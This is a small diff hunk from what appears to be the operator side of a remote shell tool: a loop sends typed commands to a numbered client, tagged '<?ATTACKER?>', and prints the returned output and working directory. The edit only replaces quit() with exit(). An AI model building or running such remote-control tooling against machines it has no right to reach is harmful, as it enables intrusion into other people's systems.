@@ -59,7 +59,7 @@ output, cwd = recieved.split("<sep>")
 while True:
     command = input(cwd + "?>")
     if command == "close":
-        quit()
+        exit()
     send(clientnum + "<?ATTACKER?>" + command)
     recieved = recieve()
     output, cwd = recieved.split("<sep>")
